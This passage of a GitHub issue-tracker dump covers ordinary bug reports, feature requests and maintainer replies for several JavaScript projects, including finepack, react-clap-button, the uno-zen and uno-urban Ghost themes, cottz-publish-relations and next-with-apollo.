Either checking if the file exists using [`fs.existsSync()`](https://nodejs.org/api/fs.html#fs_fs_existssync_path) or maybe wrapping the `fs.readFileSync()` in a `try...catch` block.

---

**UPDATE:** It looks like just wrapping the `fs.readFileSync()` in a `try...catch` block may be the answer (per Node docs):

&gt; `fs.exists()` is an anachronism and exists only for historical reasons. There should almost never be a reason to use it in your own code.
&gt; In particular, checking if a file exists before opening it is an anti-pattern that leaves you vulnerable to race conditions: another process may remove the file between the calls to `fs.exists()` and `fs.open()`. Just open the file and handle the error when it's not there.
&gt; **`fs.exists()` will be deprecated.**
&gt; ...
&gt; **`fs.existsSync()` will be deprecated.**
&gt; 
&gt; &amp;mdash; via https://nodejs.org/api/fs.html#fs_fs_exists_path_callback
</Body>
    <State>open</State>
    <Comment>
      <Owner>pdehaan</Owner>
      <Body>Not sure if relevant, but I'm using Node 0.10.35 and npm 1.4.28 apparently.

``` sh
$ node -v; npm -v
v0.10.35
1.4.28
```
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>so basically update the code and use `fs.exists` ?
</Body>
    </Comment>
  </Issue_623>
  <Issue_624>
    <Repository>finepack</Repository>
    <Title>lint `main` and `bin` file paths</Title>
    <Owner>Kikobeats</Owner>
    <Body>I've seen this in a few of our project's lately, so it'd be nice if the `finepack` tool could check if the file specified in `main` and `bin` paths are valid (something like `fs.existsSync()` or whatever).

For example, I think by default npm sets the `main` script to "index.js". In my case, the index file is set to "indexxxx.js" which doesn't exist. It'd be nice if **finepack** could display a warning or error.

``` json
{
  "name": "espree-test",
  "description": "",
  "version": "1.0.0",
  "author": "peter",
  "dependencies": {
    "canonical-json": "0.0.4",
    "espree": "1.11.0"
  },
  "license": "WTFPL",
  "main": "indexxxx.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" &amp;&amp; exit 1"
  }
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>pdehaan</Owner>
      <Body>Basically something like this (but I guess in CoffeeScript):

``` js
'use strict';

var exists = require('fs').existsSync;

var pkg = require('./package.json');

if (pkg.main) {
  checkFile(pkg.main);
}

if (pkg.bin) {
  switch (typeof pkg.bin) {
  case 'string':
    checkFile(pkg.bin);
    break;

  case 'object':
    Object.keys(pkg.bin).forEach(function (key) {
      checkFile(pkg.bin[key]);
    });
    break;
  }
}

function checkFile(file) {
  if (!exists(file)) {
    console.error('%s doesn\'t exist.', file);
  }
}
```

Not sure if there are other fields in package.json that may point to specific paths, but those would probably be good to lint to, if any of this is a good idea.
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>I put this in the backlog for the next version :-)
</Body>
    </Comment>
  </Issue_624>
  <Issue_625>
    <Repository>generator-git</Repository>
    <Title>Add @flow to transpilers</Title>
    <Owner>Kikobeats</Owner>
    <Body>Would be nice to have **flow** other than just `coffee-script`.&#13;
&#13;
I'll create a PR for this if you like the idea &#128516;  </Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Absolutely, just keep in mind that also is necessary add the way for "transpiling" flow using a command and add the packages necessaries &#128516;</Body>
    </Comment>
    <Comment>
      <Owner>kutyel</Owner>
      <Body>Sure! will do &#128521; </Body>
    </Comment>
    <Comment>
      <Owner>kutyel</Owner>
      <Body>This is just a reminder for myself, but using&#13;
```sh&#13;
npm install --save-dev flow-remove-types&#13;
```&#13;
there is no need to use Babel and it will work great with Node! &#128521; </Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>maybe @breadadams is interested in &#128516;</Body>
    </Comment>
    <Comment>
      <Owner>breadadams</Owner>
      <Body>We _had_ flow typing but you chose to remove it @kikobeats? &#129300;</Body>
    </Comment>
  </Issue_625>
  <Issue_626>
    <Repository>js-mythbusters</Repository>
    <Title>.toString and .toJSON serialization</Title>
    <Owner>Kikobeats</Owner>
    <Body>**Description**&#13;
Would be great to talk about how .toString() is used, it's recently been updated in the latest V8 release.&#13;
&#13;
`Function.prototype.toString() now returns exact slices of source code text, including whitespace and comments`&#13;
https://v8project.blogspot.com.es/2018/03/v8-release-66.html</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Could be good to extend the section explaining&#13;
&#13;
- The difference between `.toString` and `.toJSON` (for example, RegExp doesn't have toJSON!)&#13;
- Native implementation vs custom implementations&#13;
&#13;
</Body>
    </Comment>
  </Issue_626>
  <Issue_627>
    <Repository>js-mythbusters</Repository>
    <Title>Symbol API explained</Title>
    <Owner>Kikobeats</Owner>
    <Body>**Context:**&#13;
It would be great if we can explain how the new ES6 Symbol API works and how `toPromitive` is used in every type coercion.&#13;
&#13;
**Screenshots:**&#13;
&lt;img width="1280" alt="screen shot 2018-03-22 at 18 37 22" src="https://user-images.githubusercontent.com/881069/37787807-2468e96c-2e00-11e8-914f-188859aa562c.png"&gt;&#13;
&lt;img width="1280" alt="screen shot 2018-03-22 at 18 37 33" src="https://user-images.githubusercontent.com/881069/37787808-2484e86a-2e00-11e8-863f-e9d2a3e4690b.png"&gt;&#13;
&lt;img width="1280" alt="screen shot 2018-03-22 at 18 37 42" src="https://user-images.githubusercontent.com/881069/37787809-249df60c-2e00-11e8-9143-2ed29877f5ca.png"&gt;&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Probably we need to create a new section for this</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>&gt; An object is said to be iterable if it exposes a property called Symbol.iterable, which is a function that returns an iterator object.&#13;
&#13;
https://loige.co/javascript-iterator-patterns/</Body>
    </Comment>
  </Issue_627>
  <Issue_628>
    <Repository>meaning-cloud</Repository>
    <Title>response body should be object</Title>
    <Owner>Kikobeats</Owner>
    <Body>Just a suggestion to make this more useful.
I really expected the response to already be parsed, but it is a string. 
Using the request object directly with the option json:true would at least give me that.
</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>absolutely! can you convert this into a PR? :D
</Body>
    </Comment>
    <Comment>
      <Owner>duckworth</Owner>
      <Body>Sorry, thought this was a Meaning Cloud supported sdk. They linked to it from their sdk's page.
</Body>
    </Comment>
  </Issue_628>
  <Issue_629>
    <Repository>react-clap-button</Repository>
    <Title>react-clap-buttton is not properly namespaced</Title>
    <Owner>Kikobeats</Owner>
    <Body>Hi @Kikobeats &#13;
&#13;
first of all thanks for the react-clap-button!&#13;
I've experienced an issue when one need to display several react-clap-buttons on one page.&#13;
In this case it becomes unfunctional - animation, counters, styling.&#13;
&#13;
Unfortunately I'm in hurry right now. If anyone has some time to fix it properly here's some context info:&#13;
&#13;
mojs configuration has static(non namespaced) settings(*el:* and "parent:")&#13;
Same with ClapButton's, ClapIcon's, ClapCount's and ClapCountTotal's ids.&#13;
It's all localised in one file - src/index.js</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Can you make your error reproducible using [codesandbox](https://codesandbox.io)?</Body>
    </Comment>
  </Issue_629>
  <Issue_630>
    <Repository>react-clap-button</Repository>
    <Title>Add callback for click</Title>
    <Owner>Kikobeats</Owner>
    <Body>Would be ideal to allow users to hook into the `onClick` event, returning them a payload. eg.&#13;
&#13;
```&#13;
{&#13;
 'event': Event,&#13;
 'totalClickCount': 345,&#13;
 'userClickCount': 13&#13;
}&#13;
```&#13;
&#13;
It'd probably be best to do it "after click", so maybe an `afterClick` prop? That we'd add as the callback to the current `onClick` method's `this.setState(&#8230;`.</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>good point &#128578;</Body>
    </Comment>
    <Comment>
      <Owner>anandundavia</Owner>
      <Body>Any updates on this issue !?&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>nfedyashev</Owner>
      <Body>HTH&#13;
&#13;
meanwhile I'm using&#13;
&gt;  componentDidUpdate(prevProps, prevState) {&#13;
&gt;    if (this.state.count !== prevState.count) {</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>People interested in this; Please make a PR, this is a trivial thing that can be added into the library easily.</Body>
    </Comment>
  </Issue_630>
  <Issue_631>
    <Repository>react-clap-button</Repository>
    <Title>Add disabled state</Title>
    <Owner>Kikobeats</Owner>
    <Body>![screen shot 2018-02-20 at 23 49 42](https://user-images.githubusercontent.com/2096101/36453556-be70c4aa-1698-11e8-90ee-1d8b02c413d2.png)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>lcampanis</Owner>
      <Body>@Kikobeats - Will this be implemented soon by any chance, through an option?</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Hey @lcampanis, currently I'm a bit busy with other projects&#13;
&#13;
PR's are welcome! &#128578; </Body>
    </Comment>
  </Issue_631>
  <Issue_632>
    <Repository>sails-hook-winston</Repository>
    <Title>Console logger custom timestamp not working</Title>
    <Owner>Kikobeats</Owner>
    <Body>Hello,

I have configured the hook and everything works fine.
The only issue Im having is that on setting up a custom timestamp for console transport it is not working.
The custom function is never called and the format is always the same.

My configuration looks like the following:

```
var path = require('path');
var pkgJSON = require(path.resolve('package.json'));
var moment = require('moment');

module.exports.log = {

  // This options are for Console transport that is used by default
  level: 'debug', // you are familiar with this value, right?
  timestamp: function(){ return '111111111'; }, // if you want to output the timestamp in the console transport

  // Transports
  // more information: https://github.com/winstonjs/winston/blob/master/docs/transports.md
  transports: [
    {
      module: require('winston-daily-rotate-file'),
      config: {
        dirname: path.resolve('logs'),
        datePattern: '.yyyy-MM-dd.log',
        filename: pkgJSON.name,
        prettyPrint: true,
        timestamp: true,
        level: 'debug'
      }
    }
  ]
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>kvindasAB</Owner>
      <Body>Hello,

Reviewing the code just found: timestampFormat.

This attribute is missing from documentation I think.

I still think using a function for timestamp will be more standardized with the default winston behavior.

Thanks.
</Body>
    </Comment>
  </Issue_632>
  <Issue_633>
    <Repository>sort-values</Repository>
    <Title>sort-values not working for decimal values</Title>
    <Owner>Kikobeats</Owner>
    <Body>var tmeps = {&#13;
        "1320220" : 0.0161923902630579,&#13;
        "1320158" : 0.017604093182265,&#13;
        "1320377" : 0.0223638428564213,&#13;
        "1320170" : 0.0161923902630579,&#13;
        "1320025" : 0.0192743215118297,&#13;
        "1320257" : 0.02473802899216,&#13;
        "1320342" : 0.0266098465271569,&#13;
        "1320277" : 0.0222193967397038,&#13;
        "1320107" : 0.0212178971507512&#13;
    }&#13;
 var copy =sortValues(tmeps, 'asc');&#13;
sorted object &#13;
{ '1320025': 0.01927432151182973,&#13;
  '1320107': 0.021217897150751234,&#13;
  '1320158': 0.017604093182265006,&#13;
  '1320170': 0.016192390263057903,&#13;
  '1320220': 0.016192390263057903,&#13;
  '1320257': 0.024738028992160037,&#13;
  '1320277': 0.022219396739703762,&#13;
  '1320342': 0.026609846527156863,&#13;
  '1320377': 0.022363842856421304 }&#13;
&#13;
&#13;
it is sorting based on key not on values&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Apparently, Node.js is sorting keys under the umbrella&#13;
&#13;
&lt;img width="361" alt="screen shot 2018-03-12 at 10 28 06" src="https://user-images.githubusercontent.com/2096101/37276416-e746e1f4-25e1-11e8-9be1-79a36fa934b9.png"&gt;&#13;
&#13;
any idea to avoid that?&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>A solution could convert it into a Map and then serialize again into object &#129300; </Body>
    </Comment>
  </Issue_633>
  <Issue_634>
    <Repository>tweet-selection</Repository>
    <Title>Remove trailing and leading white spaces</Title>
    <Owner>Kikobeats</Owner>
    <Body>Upon tweeting, the trailing and leading white spaces of a selection should be removed.</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>I wrote this long time ago, so not sure what you means.&#13;
&#13;
Can you provide a GIF?&#13;
&#13;
PR are welcome as well &#128516;</Body>
    </Comment>
  </Issue_634>
  <Issue_635>
    <Repository>uno-urban</Repository>
    <Title>How to change home page button colors?</Title>
    <Owner>Kikobeats</Owner>
    <Body>I read the guide and edited the _variables.scss file&#13;
&#13;
I found that I had to rebuild&#13;
&#13;
When I use gulp I get the following:&#13;
&#13;
[06:34:51] Failed to load external module coffee-script/register&#13;
[06:34:51] Failed to load external module coffee-script&#13;
/data/justinchandler-blog2/themes/uno-urban-4.0.1/gulpfile.coffee:3&#13;
# -- Dependencies --------------------------------------------------------------&#13;
^&#13;
&#13;
SyntaxError: Unexpected token ILLEGAL&#13;
    at exports.runInThisContext (vm.js:53:16)&#13;
    at Module._compile (module.js:374:25)&#13;
    at Object.Module._extensions..js (module.js:417:10)&#13;
    at Module.load (module.js:344:32)&#13;
    at Function.Module._load (module.js:301:12)&#13;
    at Module.require (module.js:354:17)&#13;
    at require (internal/module.js:12:17)&#13;
    at execute (/usr/local/lib/node_modules/gulp-cli/lib/versioned/^3.7.0/index.js:24:18)&#13;
    at Liftoff.handleArguments (/usr/local/lib/node_modules/gulp-cli/index.js:149:63)&#13;
    at Liftoff.&lt;anonymous&gt; (/usr/local/lib/node_modules/gulp-cli/node_modules/liftoff/index.js:198:16)&#13;
&#13;
&#13;
I can't seem get it to take my new settings or rebuild</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>what's node version are you using? Try with the last stable or LTS</Body>
    </Comment>
    <Comment>
      <Owner>jdchandler</Owner>
      <Body>root@Shad0wFlix:/data/justinchandler-blog2/themes/uno-urban-4.0.1# npm version&#13;
{ 'uno-urban': '4.0.1',&#13;
  npm: '3.5.2',&#13;
  ares: '1.10.1-DEV',&#13;
  http_parser: '2.5.0',&#13;
  icu: '55.1',&#13;
  modules: '46',&#13;
  node: '4.2.6',&#13;
  openssl: '1.0.2g',&#13;
  uv: '1.8.0',&#13;
  v8: '4.5.103.35',&#13;
  zlib: '1.2.8' }&#13;
&#13;
root@Shad0wFlix:/data/justinchandler-blog2/themes/uno-urban-4.0.1# gulp&#13;
[15:19:44] Failed to load external module coffee-script/register&#13;
[15:19:44] Failed to load external module coffee-script&#13;
/data/justinchandler-blog2/themes/uno-urban-4.0.1/gulpfile.coffee:3&#13;
# -- Dependencies --------------------------------------------------------------&#13;
^&#13;
&#13;
SyntaxError: Invalid or unexpected token&#13;
    at new Script (vm.js:79:7)&#13;
    at createScript (vm.js:251:10)&#13;
    at Object.runInThisContext (vm.js:303:10)&#13;
    at Module._compile (internal/modules/cjs/loader.js:657:28)&#13;
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:700:10)&#13;
    at Module.load (internal/modules/cjs/loader.js:599:32)&#13;
    at tryModuleLoad (internal/modules/cjs/loader.js:538:12)&#13;
    at Function.Module._load (internal/modules/cjs/loader.js:530:3)&#13;
    at Module.require (internal/modules/cjs/loader.js:637:17)&#13;
    at require (internal/modules/cjs/helpers.js:20:18)&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>node v4 is too old, try run it with node 8 or higher</Body>
    </Comment>
  </Issue_635>
  <Issue_636>
    <Repository>uno-urban</Repository>
    <Title>Search on article pages?</Title>
    <Owner>Kikobeats</Owner>
    <Body># General comment&#13;
&#13;
Is there a way to make Search work on article pages?&#13;
&#13;
## Environment Settings&#13;
&#13;
- Theme version: 3.3.4&#13;
- Browser: all - not relevant&#13;
- OS: all - not relevant&#13;
&#13;
### Expected Behavior&#13;
&#13;
I would expect search to work on all pages&#13;
&#13;
### Actual Behavior&#13;
&#13;
Search only works on the homepage&#13;
&#13;
### Steps to reproduce the behavior&#13;
&#13;
Activate search. Go to a blog page: the search box disapears from the side bar</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Do you mean search inside a post?</Body>
    </Comment>
    <Comment>
      <Owner>franklouwers</Owner>
      <Body>No. not exactly. Take this example on your blog:&#13;
&#13;
https://kikobeats.com/#open --&gt; the "homepage" (in #open format): the searchbox is visible&#13;
&#13;
https://kikobeats.com/react-resources/ -&gt; The searchbox is not visible. </Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Oh, I see your point now.&#13;
&#13;
Need a little of effor but definetly could be possible.&#13;
&#13;
Let me track this issue for the next minor version &#128516;&#13;
&#13;
Thanks for the suggestion!</Body>
    </Comment>
    <Comment>
      <Owner>franklouwers</Owner>
      <Body>@Kikobeats Any update on this? Is uno-urban still under dev? This bug + the blinking images one, are the 2 big ones...</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>Hey,&#13;
&#13;
The current algolia integration is a little tricky. The problem for reach this is the context avaiable at `post` page in Ghost is different than `home`.&#13;
&#13;
I'm waiting a better integration from my Algolia folks, probably using Ghost Apps, or using&#13;
https://github.com/mlbrgl/ghost-algolia</Body>
    </Comment>
  </Issue_636>
  <Issue_637>
    <Repository>uno-zen</Repository>
    <Title>Please update to support the latest ghost version.</Title>
    <Owner>Kikobeats</Owner>
    <Body>thank u.</Body>
    <State>open</State>
    <Comment>
      <Owner>bioharz</Owner>
      <Body>&#13;
    File: partials/post-author.hbs&#13;
    - Replace the {{author.name}} helper with {{primary_author.name}} or {{authors.[#].name}}&#13;
    - Replace the {{author.profile_image}} helper with {{primary_author.profile_image}} or {{authors.[#].profile_image}}&#13;
&#13;
    File: styles&#13;
    - The .kg-width-wide CSS class is required to use your theme with 2.0&#13;
    - The .kg-width-full CSS class is required to use your theme with 2.0&#13;
&#13;
Have to try that out?&#13;
I don't have much time at the time. But may I consider to fix the 2 files next week.&#13;
Feel free to contribute to that project.&#13;
</Body>
    </Comment>
  </Issue_637>
  <Issue_638>
    <Repository>uno-zen</Repository>
    <Title>Mobile version the menu toggle does nothing</Title>
    <Owner>Kikobeats</Owner>
    <Body>Tested on both Oneplus 5 and Safari.</Body>
    <State>open</State>
    <Comment>
      <Owner>OpenWaveDigital</Owner>
      <Body>Same for me, tested on android chrome, and Firefox desktop - toggle does nothing.</Body>
    </Comment>
    <Comment>
      <Owner>achreftlili</Owner>
      <Body>you need to integrate jquery like explained in readme</Body>
    </Comment>
  </Issue_638>
  <Issue_639>
    <Repository>uno-zen</Repository>
    <Title>Google search action needs update</Title>
    <Owner>Kikobeats</Owner>
    <Body>when pressing ENTER, browser jumps to `https://www.google.co.id/search?q=site:http://www.example.com&amp;cad=h`, missing the keyword.&#13;
I'm using the latest version.</Body>
    <State>open</State>
    <Comment>
      <Owner>tengu-br</Owner>
      <Body>Also facing this issue...&#13;
&#13;
Apparently uno-zen used to use [ghostHunter](https://github.com/jamalneufeld/ghostHunter), but not anymore... I wonder why that is !</Body>
    </Comment>
  </Issue_639>
  <Issue_640>
    <Repository>uno-zen</Repository>
    <Title>Make share links bellow the article</Title>
    <Owner>Kikobeats</Owner>
    <Body>What do you think about adding some share links/icons bellow the article? I think it will be wonderful and more easy to share on various social networks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>It's possible to share using Twitter, but I understand that could be great have more socials linked.

The problem are:

1) How to integrate more social buttons following minimal UI.
2) Don't load external scripts to be possible do it.

Maybe [share.js](https://ellisonleao.github.io/sharer.js/) could be interesting. PR for this are welcome :-)
</Body>
    </Comment>
    <Comment>
      <Owner>floryn90</Owner>
      <Body>we can make a simple div or something bellow the article with various 
social icons and links to various social networks for sharing. in this 
mode you don't need to import nothing. the result is the same as twitter 
share

Il 16/02/2016 10:02, Kiko Beats ha scritto:

&gt; It's possible to share using Twitter, but I understand that could be 
&gt; great have more socials linked.
&gt; 
&gt; The problem are:
&gt; 
&gt; 1) How to integrate more social buttons following minimal UI.
&gt; 2) Don't load external scripts to be possible do it.
&gt; 
&gt; Maybe share.js https://ellisonleao.github.io/sharer.js/ could be 
&gt; interesting. PR for this are welcome :-)
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub 
&gt; https://github.com/Kikobeats/uno-zen/issues/180#issuecomment-184585617.
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>I undestand your intention, but words are easy &#128516;. 
- Where do you put the div? up, down, left? 
- What social networks do you consider important yo put inside?
- How we can do div configurable to be adaptable for each user?

Then resolve this questions (and maybe something else) and convert them into a PR.
</Body>
    </Comment>
    <Comment>
      <Owner>floryn90</Owner>
      <Body>the div container personally i will put it on bottom between the article 
and footer.
for the links, you have only generate a link such as 
https://www.facebook.com/sharer/sharer.php?u=&lt;post url&gt;
personally i prefer g+, facebook and twitter

Il 16/02/2016 10:08, Kiko Beats ha scritto:

&gt; I undestand your intention, but words are easy &#128516;.
&gt; 
&gt; Where do you put the div? up, down, left?
&gt; What social networks do you consider important yo put inside?
&gt; How we can do div configurable to be adaptable for each user?
&gt; 
&gt; Then resolve this questions (and maybe something else) and convert 
&gt; them into a PR.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub 
&gt; https://github.com/Kikobeats/uno-zen/issues/180#issuecomment-184587479.
</Body>
    </Comment>
    <Comment>
      <Owner>subzer0x0</Owner>
      <Body>This site(addthis.com) would be my suggestion to include share button in every post
</Body>
    </Comment>
    <Comment>
      <Owner>floryn90</Owner>
      <Body>is not required importing some external links but is necessary only a link maker such as in my previous post
</Body>
    </Comment>
  </Issue_640>
  <Issue_641>
    <Repository>uno-zen</Repository>
    <Title>[Feature] RTL Support</Title>
    <Owner>Kikobeats</Owner>
    <Body>Hi there.

RTL support is essential for bloggers how writes in Arabic, Farsi and Hebrew since these languages are written from Right to Left.

I can add a task to support RTL. The task could go in two directions:
1. Add an additional CSS file to do the RTL stuff. And anyone how wants RTL blog he can add this additional file to the head tag.
2. Add a task to flip the generated CSS file and generate a RTL CSS file. And anyone who wants RTL blog should edit the USS file URL in the head tag to call the RTL version.

I think the second options is better and easier to maintain. Twitter team have released a library to flip the CSS and it does support ignore \ replace declarations:

https://github.com/twitter/css-flip
</Body>
    <State>open</State>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>If the RTL CSS need to be generated based in the current theme CSS, 2 is better.

Do you think that generic 1 is possible? or RTL depend of each user case CSS?
</Body>
    </Comment>
  </Issue_641>
  <Issue_642>
    <Repository>cottz-publish</Repository>
    <Title>Different from Tom's publish-with-relations?</Title>
    <Owner>lfades</Owner>
    <Body>This package is named the same as @tmeasday's, but the API seems quite different. Was it a fork initially?
</Body>
    <State>open</State>
    <Comment>
      <Owner>lfades</Owner>
      <Body>it is not, but did not know what to name, currently the Api change much and I'll change the name to cottz:publish
</Body>
    </Comment>
    <Comment>
      <Owner>dandv</Owner>
      <Body>Will you change the name any time soon?

https://atmospherejs.com/cottz/publish-with-relations also shows no history on Atmosphere.
</Body>
    </Comment>
    <Comment>
      <Owner>lfades</Owner>
      <Body>I do not know how to remove a package completely from Atmosphere
</Body>
    </Comment>
    <Comment>
      <Owner>dandv</Owner>
      <Body>That's ok, actually there's no way to completely remove a package from Atmosphere, because that would break other packages or apps that depend on it.

The recommended practice is to hide the package from Atmosphere searches by running this:

```
meteor admin set-unmigrated &lt;package:name&gt;
```
</Body>
    </Comment>
    <Comment>
      <Owner>dandv</Owner>
      <Body>Hi @cottz / @Goluis,

You can hide [this package](https://atmospherejs.com/cottz/publish) from Atmosphere and let only the new one be searchable:

```
meteor admin set-unmigrated cottz:publish
```

Thanks for keeping Atmosphere clean,
Dan
</Body>
    </Comment>
  </Issue_642>
  <Issue_643>
    <Repository>cottz-publish-relations</Repository>
    <Title>the parent doc is removed, the related children doc is not removed.</Title>
    <Owner>lfades</Owner>
    <Body>```&#13;
this.cursor(Authors.find(authorId), function (id, doc) {&#13;
  this.cursor(Books.find({authorId: id}), function (id, doc) {&#13;
    this.cursor(Comments.find({bookId: id}));&#13;
  });&#13;
});&#13;
```&#13;
when i remove authorId1, the publish authorId1 is removed on client. but the published authorId1's books and comments to client not is removed. &#13;
please help me out. thank you!&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>fangjj</Owner>
      <Body>@lfades any idea about this?</Body>
    </Comment>
    <Comment>
      <Owner>fangjj</Owner>
      <Body>@lfades any update, please</Body>
    </Comment>
    <Comment>
      <Owner>lfades</Owner>
      <Body>Hello! I'm no longer supporting this package because of lack of time and of the current state of Meteor, but I'm going to try to answer the question, I don't think that the comments or books should be removed, the cursors are stopped in the server, but you can manually remove the documents from the cache in the client.</Body>
    </Comment>
    <Comment>
      <Owner>fangjj</Owner>
      <Body>thank you for your reply. how to manually remove the documents from the cache in the client? just like this:&#13;
```&#13;
Authors.find(authorId).observeChanges({&#13;
 removed(id) {&#13;
  const bookIds = Books.find({authorId: id}).map(book =&gt; book._id);&#13;
  Books.remove(_id: {$in: bookIds});&#13;
  Comments.remove({bookId: {$in: bookIds}});&#13;
 }&#13;
})&#13;
```&#13;
Meteor platform is still alive, why you are running away meteor.</Body>
    </Comment>
    <Comment>
      <Owner>lfades</Owner>
      <Body>it was a performance and scalability decision, my current stack is Next.js + Apollo / Node.&#13;
&#13;
The solution you're using may work, if you can do it from the client using minimongo, that may be better.</Body>
    </Comment>
  </Issue_643>
  <Issue_644>
    <Repository>cottz-publish-relations</Repository>
    <Title>Add support for server minimongo</Title>
    <Owner>lfades</Owner>
    <Body>When trying to publish from server-only minimongo, following error is shown:&#13;
```&#13;
TypeError: Cannot read property 'selector' of undefined&#13;
at HandlerController.add (packages/cottz:publish-relations/lib/server/handler_controller.js:22:34)&#13;
at CursorMethods.cursor (packages/cottz:publish-relations/lib/server/cursor/cursor.js:20:34)&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>lfades</Owner>
      <Body>Maybe at some point the internal implementation of minimongo changed and [this line](https://github.com/lfades/cottz-publish-relations/blob/master/lib/server/handler_controller.js#L20) may have broke.</Body>
    </Comment>
    <Comment>
      <Owner>vblagomir</Owner>
      <Body>I guess there are no plans to fix this? :-)</Body>
    </Comment>
    <Comment>
      <Owner>lfades</Owner>
      <Body>Yeah, sorry about that.&#13;
&#13;
I'm not working with Meteor anymore, and even If I come back because I still think Meteor is great, I'll use Apollo Graphql instead of publish/subscribe.</Body>
    </Comment>
  </Issue_644>
  <Issue_645>
    <Repository>cottz-publish-relations</Repository>
    <Title>Changing filters reactively</Title>
    <Owner>lfades</Owner>
    <Body>First of all, the package looks great!

I know this is a weird error and I'll give you two very similar scripts, the first one works, the second doesn't.

In this case, the publication takes in the filters by which it searches the products.

``` js
PublishRelations('products', function(filters) {
  if (!this.userId || !Meteor.users.findOne(this.userId)) {
    return this.ready();
  }
  this.cursor(Products.find(filters));
  this.ready();
});
```

This works as expected.

In this other case, the filters get read from the user document. I update the user's filters via a Meteor.method and they are updated correctly. This publish gives the correct products to the client, but upon changing filters, those products that did much and now doesn't, don't get removed and also don't get updated reactively when they change.

``` js
PublishRelations('products', function() {
  if (!this.userId || !Meteor.users.findOne(this.userId)) {
    return this.ready();
  }
  this.cursor(Meteor.users.find(this.userId, { limit: 1 }), function(id, doc) {
    this.cursor(Products.find(doc.filters));
  });
  this.ready();
});
```

Everything gets fixed when refreshing the page so this looks related to the users collection. Does it behave differently from a normal collection?

Any ideas? Hope this helps.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lfades</Owner>
      <Body>try this:

``` js
this.cursor(Meteor.users.find(this.userId, { limit: 1 }), function(id, doc) {
  if (doc.filters) {
    this.cursor(Products.find(doc.filters));
  }
});
```

the problem can be when a different field is updated in the user, then if you update for example the username `doc` will only have the username and not the entire document so `doc.filters` will be `undefined` (I said that in the documentation but maybe I'm not as good doing documentation :'c).

The previous behavior is the expected because you only want to restart the products query when changing the `filters` field.

According to the above, the following code can also work, since only receive updates when `filters` change and is better if you don't need more user fields.

``` js
this.cursor(Meteor.users.find(this.userId, { limit: 1, fields: {filters: 1} }), function(id, doc) {
  this.cursor(Products.find(doc.filters));
});
```
</Body>
    </Comment>
    <Comment>
      <Owner>knoid</Owner>
      <Body>Ohh ok, I didn't understand that from the docs but anyway I was only changing the filters and I ended up `console.log`-ing the filters and it was never undefined. So, no idea why that happens.
</Body>
    </Comment>
    <Comment>
      <Owner>lfades</Owner>
      <Body>check the update you are doing on the user, I'm not quite sure how to help there :S
</Body>
    </Comment>
  </Issue_645>
  <Issue_646>
    <Repository>next-with-apollo</Repository>
    <Title>Material-UI v4 display warnings when used with next-with-apollo</Title>
    <Owner>lfades</Owner>
    <Body>Related issue at MUI repository: [#15798](https://github.com/mui-org/material-ui/issues/15798#issuecomment-497307134)&#13;
&#13;
After update to Material-UI v4.0, lots of warnings started to show at DevTools.&#13;
If I remove `next-with-apollo` and follow the example [with-apollo-auth](https://github.com/zeit/next.js/tree/master/examples/with-apollo-auth), everything works fine.</Body>
    <State>open</State>
    <Comment>
      <Owner>eps1lon</Owner>
      <Body>Issue is likely caused by bundling a polyfill which relies on the `window` object. `window` should be undefined on the server IMO.</Body>
    </Comment>
    <Comment>
      <Owner>oliviertassinari</Owner>
      <Body>I believe we have identified the source of the problem:&#13;
 https://github.com/mui-org/material-ui/issues/15798#issuecomment-497980950</Body>
    </Comment>
  </Issue_646>
  <Issue_647>
    <Repository>next-with-apollo</Repository>
    <Title>can't use setstate when use &lt;Link&gt; second page</Title>
    <Owner>lfades</Owner>
    <Body>the first page a &lt;Link&gt; will receive data from graphql. second time I clicked &lt;Link&gt; nextjs not render the new data from graphql (another link) but the same link same data in previous creche render correctly. please see the capture screen &#13;
https://media.giphy.com/media/eMUztsvqbousK4yyQV/giphy.gif&#13;
&#13;
ps. I receive data from {data} render will completed but second page graphql not load = can't set state onCompleted={}&#13;
`&lt;Query query={QUER_DATA_EDIT} variables={{ id }} onCompleted={(data) =&gt; this.setData(data.edit_categories[0].data[0])}&gt;&#13;
                {({ data, loading, error }) =&gt; {&#13;
